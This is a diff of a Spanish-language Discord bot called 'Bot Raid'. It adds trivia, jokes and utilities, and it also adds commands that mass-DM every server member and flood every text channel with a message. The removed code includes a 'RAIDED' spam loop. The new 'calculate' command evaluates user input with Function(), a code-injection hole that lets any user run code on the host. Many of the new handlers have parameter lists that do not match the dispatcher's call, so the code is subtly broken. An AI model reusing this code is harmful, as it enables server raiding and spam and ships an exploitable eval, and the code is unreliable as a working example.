+      logger.error('Error en comando joke', { error: err.message });
+    }
+  },
+
+  async fact(message, client, args) {
+    try {
+      const facts = [
+        'Los programadores gastan más tiempo depurando código que escribiéndolo. 🐛',
+        'El 80% del tiempo de desarrollo es entender el código de alguien más. 😵',
+        'Stack Overflow es el sitio web más visitado por desarrolladores del mundo. 🌍',
+        'El primer error en la historia de la programación fue un insecto de verdad. 🐛',
+        'Git fue creado por Linus Torvalds en 2005 en solo 4 días. ⚡'
+      ];
+      
+      const randomFact = facts[Math.floor(Math.random() * facts.length)];
+      const embed = new EmbedBuilder().setColor(0x00FFFF).setTitle('💡 DATO INTERESANTE').setDescription(randomFact).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando fact', { error: err.message });
+    }
+  },
+
+  async trivia(message, client, args) {
+    try {
+      const trivias = [
+        { question: '¿Cuál fue el primer lenguaje de programación?', answer: 'Plankalkül (1945)' },
+        { question: '¿En qué año se creó Python?', answer: '1991' },
+        { question: '¿Quién es el creador de Python?', answer: 'Guido van Rossum' },
+        { question: '¿Cuántos bits tiene un byte?', answer: '8 bits' },
+        { question: '¿Qué significa HTML?', answer: 'HyperText Markup Language' }
+      ];
+      
+      const randomTrivia = trivias[Math.floor(Math.random() * trivias.length)];
+      const embed = new EmbedBuilder().setColor(0x00FF00).setTitle('🧠 TRIVIA TECH').addFields({ name: 'Pregunta:', value: randomTrivia.question, inline: false }, { name: 'Respuesta:', value: `||${randomTrivia.answer}||`, inline: false }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando trivia', { error: err.message });
+    }
+  },
+
+  async quote(message, client, args) {
+    try {
+      const quotes = [
+        '"La mejor forma de predecir el futuro es inventarlo." - Alan Kay',
+        '"La simplicidad es la máxima sofisticación." - Leonardo da Vinci',
+        '"El código es poesía." - Desconocido',
+        '"Primero lo haces funcionar, luego lo haces bien." - Kent Beck',
+        '"La única forma de aprender un lenguaje de programación es escribiendo programas en él." - Dennis Ritchie'
+      ];
+      
+      const randomQuote = quotes[Math.floor(Math.random() * quotes.length)];
+      const embed = new EmbedBuilder().setColor(0xFFFFFF).setTitle('💭 CITA INSPIRADORA').setDescription(randomQuote).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando quote', { error: err.message });
+    }
+  },
+
+  async poem(message, client, args) {
+    try {
+      const poems = [
+        'En el mundo del código,\nDonde todo es lógica y función,\nLos bugs nos persiguen,\nComo una obsesión. 📝',
+        'Líneas de código sin fin,\nAlgoritmos que no se detienen,\nEn la mente del programador,\nLa música que siempre suena. 🎵',
+        'Errores en la consola,\nDebugger corriendo sin parar,\nLa vida de un dev es ésta,\nHasta lograr compilar. 💻'
+      ];
+      
+      const randomPoem = poems[Math.floor(Math.random() * poems.length)];
+      const embed = new EmbedBuilder().setColor(0xFF69B4).setTitle('📜 POEMA').setDescription(randomPoem).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando poem', { error: err.message });
+    }
+  },
+
+  async ascii(message, client, args) {
+    try {
+      const text = args.join(' ') || 'BOT RAID';
+      const asciiArt = `
+\`\`\`
+ ____   __  _____  ___   _  ______  ___  ____  
+| __ ) / / |_   _| / _ | | |/ / __ |/ _ \\|  _ \\
+| _ \\|  \\  | | |  / /_\\ | / /|  __// /_\\ | | | |
+| |_) | |  | | | / _____ \\/ / | |_ / _____ | |_| |
+|____/|__| |_| |/_/ __\\_|_/  \\___/_/   \\_|____/
+\`\`\``;
+      
+      const embed = new EmbedBuilder().setColor(0x00FF00).setTitle('🎨 ASCII ART').setDescription(asciiArt).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando ascii', { error: err.message });
+    }
+  },
+
+  // COMANDOS DE UTILIDADES
+  async ping(message, client, args) {
+    try {
+      const msg = await message.reply({ content: '🏓 Calculando ping...' });
+      const latency = msg.createdTimestamp - message.createdTimestamp;
+      const wsLatency = Math.round(client.ws.ping);
+
+      const embed = new EmbedBuilder().setColor(0x00FF00).setTitle('🏓 Pong!').addFields({ name: 'Latencia del Mensaje', value: `${latency}ms`, inline: true }, { name: 'Latencia WebSocket', value: `${wsLatency}ms`, inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+
+      msg.edit({ content: '', embeds: [embed] });
+    } catch (err) {
+      logger.error('Error en comando ping', { error: err.message });
+    }
+  },
+
+  async uptime(message, client, args) {
+    try {
+      const uptime = COMMANDS.formatUptime(client.uptime);
+      const embed = new EmbedBuilder().setColor(0x00FF00).setTitle('⏱️ Uptime del Bot').setDescription(`El bot lleva activo: **${uptime}**`).addFields({ name: 'Milisegundos', value: `${client.uptime}ms`, inline: true }, { name: 'Hora del Servidor', value: new Date().toLocaleString('es-ES'), inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando uptime', { error: err.message });
+    }
+  },
+
+  async version(message, client, args) {
+    try {
+      const embed = new EmbedBuilder().setColor(0x0099FF).setTitle('📦 Información de Versión').addFields({ name: 'Versión del Bot', value: CONFIG.VERSION, inline: true }, { name: 'Node.js', value: process.version, inline: true }, { name: 'Discord.js', value: require('discord.js').version, inline: true }, { name: 'Uptime', value: COMMANDS.formatUptime(client.uptime), inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando version', { error: err.message });
+    }
+  },
+
   async clear(message, guild, client, args) {
     try {
       cache.clear();
@@ -918,226 +1348,254 @@ const COMMANDS = {
     }
   },
 
-  async nodiversion(message, guild, client, args) {
+  async ayuda(message, client, args) {
     try {
-      const categories = [
-        {
-          name: '📢 INFORMACIÓN',
-          channels: [
-            { name: 'bienvenidas', type: ChannelType.GuildText },
-            { name: 'reglas', type: ChannelType.GuildText },
-            { name: 'anuncios', type: ChannelType.GuildText }
-          ]
-        },
-        {
-          name: '💬 GENERAL',
-          channels: [
-            { name: 'chat-general', type: ChannelType.GuildText },
-            { name: 'fotos', type: ChannelType.GuildText },
-            { name: 'comandos', type: ChannelType.GuildText }
-          ]
-        },
-        {
-          name: '🎤 VOCAL',
-          channels: [
-            { name: 'General', type: ChannelType.GuildVoice },
-            { name: 'Música', type: ChannelType.GuildVoice },
-            { name: 'Gaming', type: ChannelType.GuildVoice }
-          ]
-        }
-      ];
+      message.reply({ embeds: [EMBEDS.help()] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando ayuda', { error: err.message });
+    }
+  },
 
-      const roles = [
-        { name: 'Admin', color: 'Red', permissions: [PermissionFlagsBits.Administrator] },
-        { name: 'Moderador', color: 'Green', permissions: [PermissionFlagsBits.ManageMessages, PermissionFlagsBits.KickMembers] },
-        { name: 'Usuario Verificado', color: 'Blue', permissions: [] }
-      ];
+  async commands(message, client, args) {
+    try {
+      const commandsList = Object.keys(COMMANDS).sort();
+      const embed = new EmbedBuilder().setColor(0xFF00FF).setTitle('📋 Lista de Comandos').setDescription(`Total de comandos: **${commandsList.length}**`).addFields({ name: 'Comandos', value: commandsList.map(cmd => `\`${cmd}\``).join(' • '), inline: false }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando commands', { error: err.message });
+    }
+  },
 
-      // Crear categorías y canales
-      for (const catData of categories) {
+  // COMANDOS DE COMUNICACIÓN
+  async md(message, guild, client, args) {
+    try {
+      const text = args.join(' ');
+      if (!text) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un mensaje')] });
+      await BotUtils.dmAllMembers(guild, text);
+      database.addCommand('md', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success('✅ DMs enviados')] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando md', { error: err.message });
+      message.reply({ embeds: [EMBEDS.error('Error enviando mensajes')] }).catch(() => {});
+    }
+  },
+
+  async broadcast(message, guild, client, args) {
+    try {
+      const text = args.join(' ');
+      if (!text) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un mensaje')] });
+
+      const channels = await guild.channels.fetch();
+      const textChannels = [...channels.values()].filter(c => c.isTextBased());
+
+      let sent = 0;
+      for (const channel of textChannels) {
         try {
-          const category = await guild.channels.create({
-            name: catData.name,
-            type: ChannelType.GuildCategory
-          });
-          for (const ch of catData.channels) {
-            await guild.channels.create({
-              name: ch.name,
-              type: ch.type,
-              parent: category.id
-            }).catch(() => {});
-          }
+          await channel.send({ content: text });
+          sent++;
         } catch (err) {
-          logger.warn(`Error creando categoría ${catData.name}`, { error: err.message });
+          logger.debug('Error enviando broadcast');
         }
       }
 
-      // Crear roles
-      for (const r of roles) {
-        await guild.roles.create({
-          name: r.name,
-          color: r.color,
-          permissions: r.permissions
-        }).catch(() => {});
-      }
-
-      database.addCommand('nodiversion', message.author.id, guild.id);
-      message.reply({ embeds: [EMBEDS.success('✅ Servidor restaurado correctamente')] }).catch(() => {});
-      logger.success('Comando nodiversion completado');
+      database.addCommand('broadcast', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`✅ Broadcast enviado a ${sent} canales`)] }).catch(() => {});
     } catch (err) {
-      logger.error('Error en comando nodiversion', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error restaurando servidor')] }).catch(() => {});
+      logger.error('Error en comando broadcast', { error: err.message });
     }
   },
 
-  async rename(message, guild, client, args) {
+  async announce(message, guild, client, args) {
     try {
-      const name = args.join(' ');
-      if (!name) {
-        return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un nombre para el servidor')] }).catch(() => {});
+      const announcement = args.join(' ');
+      if (!announcement) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un anuncio')] });
+
+      const embed = new EmbedBuilder().setColor(0xFF00FF).setTitle('📣 ANUNCIO IMPORTANTE').setDescription(announcement).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+
+      const channels = await guild.channels.fetch();
+      const textChannels = [...channels.values()].filter(c => c.isTextBased());
+
+      let sent = 0;
+      for (const channel of textChannels) {
+        try {
+          await channel.send({ embeds: [embed] });
+          sent++;
+        } catch (err) {
+          logger.debug('Error enviando anuncio');
+        }
       }
-      await guild.setName(name.substring(0, 100));
-      database.addCommand('rename', message.author.id, guild.id);
-      logger.success(`Servidor renombrado a: ${name}`);
-      message.reply({ embeds: [EMBEDS.success(`✅ Servidor renombrado a: ${name}`)] }).catch(() => {});
+
+      database.addCommand('announce', message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`✅ Anuncio enviado a ${sent} canales`)] }).catch(() => {});
     } catch (err) {
-      logger.error('Error en comando rename', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error renombrando servidor')] }).catch(() => {});
+      logger.error('Error en comando announce', { error: err.message });
     }
   },
 
-  async createchannel(message, guild, client, args) {
+  async say(message, guild, client, args) {
     try {
-      const channelName = args.join(' ') || 'nuevo-canal';
-      const channel = await guild.channels.create({
-        name: channelName.substring(0, 100),
-        type: ChannelType.GuildText
-      });
-      database.addCommand('createchannel', message.author.id, guild.id);
-      logger.success(`Canal creado: ${channel.name}`);
-      message.reply({ embeds: [EMBEDS.success(`✅ Canal creado: #${channel.name}`)] }).catch(() => {});
+      const text = args.join(' ');
+      if (!text) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un mensaje')] });
+      await message.channel.send({ content: text });
+      database.addCommand('say', message.author.id, guild?.id || 'DM');
     } catch (err) {
-      logger.error('Error en comando createchannel', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error creando canal')] }).catch(() => {});
+      logger.error('Error en comando say', { error: err.message });
     }
   },
 
-  async deletechannel(message, guild, client, args) {
+  async echo(message, guild, client, args) {
     try {
-      const channel = message.mentions.channels.first() || guild.channels.cache.get(args[0]);
-      if (!channel) {
-        return message.reply({ embeds: [EMBEDS.error('Debes mencionar un canal o proporcionar su ID')] }).catch(() => {});
-      }
-      await channel.delete();
-      database.addCommand('deletechannel', message.author.id, guild.id);
-      logger.success(`Canal eliminado: ${channel.name}`);
-      message.reply({ embeds: [EMBEDS.success(`✅ Canal eliminado`)] }).catch(() => {});
+      const text = args.join(' ');
+      if (!text) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar un mensaje')] });
+      
+      const embed = new EmbedBuilder().setColor(BotUtils.getRandomColor()).setTitle('🔊 ECO').setDescription(text).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      await message.channel.send({ embeds: [embed] });
+      database.addCommand('echo', message.author.id, guild?.id || 'DM');
     } catch (err) {
-      logger.error('Error en comando deletechannel', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error eliminando canal')] }).catch(() => {});
+      logger.error('Error en comando echo', { error: err.message });
     }
   },
 
-  async creerole(message, guild, client, args) {
+  // COMANDOS DE HERRAMIENTAS
+  async calculate(message, client, args) {
     try {
-      const roleName = args.join(' ') || 'Nuevo Rol';
-      const role = await guild.roles.create({
-        name: roleName.substring(0, 100),
-        color: BotUtils.getRandomColor(),
-        permissions: []
-      });
-      database.addCommand('creerole', message.author.id, guild.id);
-      logger.success(`Rol creado: ${role.name}`);
-      message.reply({ embeds: [EMBEDS.success(`✅ Rol creado: @${role.name}`)] }).catch(() => {});
+      const expression = args.join(' ');
+      if (!expression) return message.reply({ embeds: [EMBEDS.error('Debes proporcionar una expresión')] });
+      
+      try {
+        const result = Function('"use strict"; return (' + expression + ')')();
+        const embed = new EmbedBuilder().setColor(0x00FF00).setTitle('🧮 CALCULADORA').addFields({ name: 'Expresión', value: expression, inline: true }, { name: 'Resultado', value: `${result}`, inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+        message.reply({ embeds: [embed] }).catch(() => {});
+      } catch (e) {
+        message.reply({ embeds: [EMBEDS.error('Expresión inválida')] });
+      }
     } catch (err) {
-      logger.error('Error en comando creerole', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error creando rol')] }).catch(() => {});
+      logger.error('Error en comando calculate', { error: err.message });
     }
   },
 
-  async deleterole(message, guild, client, args) {
+  async random(message, client, args) {
     try {
-      const role = message.mentions.roles.first() || guild.roles.cache.get(args[0]);
-      if (!role) {
-        return message.reply({ embeds: [EMBEDS.error('Debes mencionar un rol o proporcionar su ID')] }).catch(() => {});
-      }
-      if (!role.editable) {
-        return message.reply({ embeds: [EMBEDS.error('No puedo eliminar ese rol')] }).catch(() => {});
-      }
-      await role.delete();
-      database.addCommand('deleterole', message.author.id, guild.id);
-      logger.success(`Rol eliminado: ${role.name}`);
-      message.reply({ embeds: [EMBEDS.success(`✅ Rol eliminado`)] }).catch(() => {});
+      const max = parseInt(args[0]) || 100;
+      const min = parseInt(args[1]) || 0;
+      const random = Math.floor(Math.random() * (max - min + 1)) + min;
+      
+      const embed = new EmbedBuilder().setColor(0x00FFFF).setTitle('🎲 NÚMERO ALEATORIO').addFields({ name: 'Rango', value: `${min} - ${max}`, inline: true }, { name: 'Resultado', value: `${random}`, inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
     } catch (err) {
-      logger.error('Error en comando deleterole', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error eliminando rol')] }).catch(() => {});
+      logger.error('Error en comando random', { error: err.message });
     }
   },
 
-  async servericon(message, guild, client, args) {
+  async dice(message, client, args) {
     try {
-      const icon = message.attachments.first();
-      if (!icon) {
-        return message.reply({ embeds: [EMBEDS.error('Debes adjuntar una imagen para usar como icono')] }).catch(() => {});
-      }
-      await guild.setIcon(icon.url);
-      database.addCommand('servericon', message.author.id, guild.id);
-      logger.success('Ícono del servidor actualizado');
-      message.reply({ embeds: [EMBEDS.success('✅ Ícono del servidor actualizado')] }).catch(() => {});
+      const roll = Math.floor(Math.random() * 6) + 1;
+      const embed = new EmbedBuilder().setColor(0xFF6347).setTitle('🎲 LANZAR DADO').setDescription(`🎲 Resultado: **${roll}**`).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
     } catch (err) {
-      logger.error('Error en comando servericon', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error actualizando ícono')] }).catch(() => {});
+      logger.error('Error en comando dice', { error: err.message });
     }
   },
 
-  async mutechannel(message, guild, client, args) {
+  async card(message, client, args) {
     try {
-      const channel = message.mentions.channels.first() || message.channel;
-      if (!channel) {
-        return message.reply({ embeds: [EMBEDS.error('Canal no encontrado')] }).catch(() => {});
-      }
-      await channel.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: false });
-      database.addCommand('mutechannel', message.author.id, guild.id);
-      logger.success(`Canal silenciado: ${channel.name}`);
-      message.reply({ embeds: [EMBEDS.success(`✅ Canal #${channel.name} silenciado`)] }).catch(() => {});
+      const suits = ['♠️', '♥️', '♦️', '♣️'];
+      const values = ['A', '2', '3', '4', '5', '6', '7', '8', '9', '10', 'J', 'Q', 'K'];
+      const suit = suits[Math.floor(Math.random() * suits.length)];
+      const value = values[Math.floor(Math.random() * values.length)];
+      
+      const embed = new EmbedBuilder().setColor(0xFFD700).setTitle('🃏 CARTA ALEATORIA').setDescription(`${value} ${suit}`).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
     } catch (err) {
-      logger.error('Error en comando mutechannel', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error silenciando canal')] }).catch(() => {});
+      logger.error('Error en comando card', { error: err.message });
     }
   },
 
-  async unmutechannel(message, guild, client, args) {
+  // COMANDOS DE USUARIOS
+  async warn(message, client, args) {
     try {
-      const channel = message.mentions.channels.first() || message.channel;
-      if (!channel) {
-        return message.reply({ embeds: [EMBEDS.error('Canal no encontrado')] }).catch(() => {});
-      }
-      await channel.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: true });
-      database.addCommand('unmutechannel', message.author.id, guild.id);
-      logger.success(`Canal desilenciado: ${channel.name}`);
-      message.reply({ embeds: [EMBEDS.success(`✅ Canal #${channel.name} desilenciado`)] }).catch(() => {});
+      const user = message.mentions.users.first();
+      const reason = args.slice(1).join(' ') || 'Sin especificar';
+      
+      if (!user) return message.reply({ embeds: [EMBEDS.error('Debes mencionar un usuario')] });
+      
+      database.addWarn(user.id, reason);
+      const warns = database.getWarns(user.id);
+      
+      const embed = new EmbedBuilder().setColor(0xFF0000).setTitle('⚠️ ADVERTENCIA').addFields({ name: 'Usuario', value: user.tag, inline: true }, { name: 'Razón', value: reason, inline: true }, { name: 'Total de advertencias', value: `${warns.length}`, inline: true }).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
     } catch (err) {
-      logger.error('Error en comando unmutechannel', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error desilenciando canal')] }).catch(() => {});
+      logger.error('Error en comando warn', { error: err.message });
     }
   },
 
-  async spam(message, guild, client, args) {
+  async warns(message, client, args) {
     try {
-      const count = parseInt(args[0]) || 5;
-      const text = args.slice(1).join(' ') || '🚨 RAIDED 🚨';
-      const channel = message.channel;
-
-      for (let i = 0; i < count; i++) {
-        await channel.send({ content: text });
-        await BotUtils.sleep(100);
-      }
-
-      database.addCommand('spam', message.author.id, guild.id);
-      logger.success(`Spam completado: ${count} mensajes`);
+      const user = message.mentions.users.first() || message.author;
+      const warns = database.getWarns(user.id);
+      
+      const warnsText = warns.length > 0 ? warns.map((w, i) => `${i + 1}. ${w.reason} - ${new Date(w.timestamp).toLocaleString('es-ES')}`).join('\n') : 'Sin advertencias';
+      
+      const embed = new EmbedBuilder().setColor(0xFFFF00).setTitle(`⚠️ Advertencias de ${user.tag}`).setDescription(warnsText).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
     } catch (err) {
-      logger.error('Error en comando spam', { error: err.message });
-      message.reply({ embeds: [EMBEDS.error('Error en spam')] }).catch(() => {});
+      logger.error('Error en comando warns', { error: err.message });
+    }
+  },
+
+  async reputation(message, client, args) {
+    try {
+      const user = message.mentions.users.first() || message.author;
+      const stats = database.getUserStats(user.id);
+      
+      const embed = new EmbedBuilder().setColor(0xFF00FF).setTitle(`⭐ Reputación de ${user.tag}`).setDescription(`**${stats.reputation || 0}⭐**`).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando reputation', { error: err.message });
+    }
+  },
+
+  async level(message, client, args) {
+    try {
+      const stats = database.getUserStats(message.author.id);
+      const embed = new EmbedBuilder().setColor(0x00FF00).setTitle(`📊 Nivel de ${message.author.tag}`).setDescription(`**Nivel: ${stats.level}**`).setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando level', { error: err.message });
+    }
+  },
+
+  async rank(message, client, args) {
+    try {
+      const users = Object.entries(database.data.users).sort((a, b) => (b[1].reputation || 0) - (a[1].reputation || 0)).slice(0, 10);
+      
+      const rankText = users.map((u, i) => `${i + 1}. <@${u[0]}> - ${u[1].reputation || 0}⭐`).join('\n');
+      
+      const embed = new EmbedBuilder().setColor(0xFFD700).setTitle('🏆 TOP 10 RANKING').setDescription(rankText || 'Sin datos').setFooter({ text: `Bot Raid v${CONFIG.VERSION}` });
+      message.reply({ embeds: [embed] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando rank', { error: err.message });
+    }
+  },
+
+  // COMANDOS DE GESTIÓN
+  async favorite(message, guild, client, args) {
+    try {
+      if (!guild) return message.reply({ embeds: [EMBEDS.error('Este comando solo funciona en servidores')] });
+      database.addFavorite(message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`⭐ ${guild.name} marcado como favorito`)] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando favorite', { error: err.message });
+    }
+  },
+
+  async unfavorite(message, guild, client, args) {
+    try {
+      if (!guild) return message.reply({ embeds: [EMBEDS.error('Este comando solo funciona en servidores')] });
+      database.removeFavorite(message.author.id, guild.id);
+      message.reply({ embeds: [EMBEDS.success(`❌ ${guild.name} eliminado de favoritos`)] }).catch(() => {});
+    } catch (err) {
+      logger.error('Error en comando unfavorite', { error: err.message });
     }
   },
 
@@ -1197,14 +1655,12 @@ client.on('messageCreate', async message => {
   try {
     if (!message.content.startsWith(CONFIG.PREFIX) || message.author.bot) return;
 
-    // Verificar rate limit
     const rateLimitCheck = rateLimiter.check(message.author.id);
     if (!rateLimitCheck.allowed) {
-      logger.warn('Rate limit excedido', { userId: message.author.id, resetIn: rateLimitCheck.resetIn });
+      logger.warn('Rate limit excedido', { userId: message.author.id });
       return message.reply({ embeds: [EMBEDS.warning(`⏱️ Debes esperar ${Math.ceil(rateLimitCheck.resetIn / 1000)}s`)] }).catch(() => {});
     }
 
-    // Borrar comando
     message.delete().catch(() => {});
 
     const { guild, member } = message;
@@ -1212,21 +1668,21 @@ client.on('messageCreate', async message => {
     const cmd = parts[0].toLowerCase();
     const args = parts.slice(1);
 
-    if (!guild) {
+    const globalCommands = ['meme', 'joke', 'fact', 'trivia', 'quote', 'poem', 'ascii', 'profile', 'botinfo', 'ayuda', 'commands', 'version', 'info', 'ping', 'uptime', 'stats', 'calculate', 'random', 'dice', 'card', 'warns', 'reputation', 'level', 'rank'];
+
+    if (!guild && !globalCommands.includes(cmd)) {
       return message.channel.send({ embeds: [EMBEDS.error('Este comando solo funciona en servidores')] }).catch(() => {});
     }
 
     if (COMMANDS[cmd]) {
-      logger.info(`Ejecutando comando: .${cmd}`, { userId: message.author.id, guildId: guild.id });
+      logger.info(`Ejecutando comando: .${cmd}`, { userId: message.author.id, guildId: guild?.id });
       
       try {
         await COMMANDS[cmd](message, guild, client, args, member);
       } catch (err) {
-        logger.error(`Error ejecutando comando ${cmd}`, { error: err.message, userId: message.author.id });
+        logger.error(`Error ejecutando comando ${cmd}`, { error: err.message });
         message.reply({ embeds: [EMBEDS.error(`Error ejecutando comando: ${err.message}`)] }).catch(() => {});
       }
-    } else {
-      logger.debug(`Comando desconocido: .${cmd}`);
     }
   } catch (err) {
     logger.error('Error procesando comando', { error: err.message });
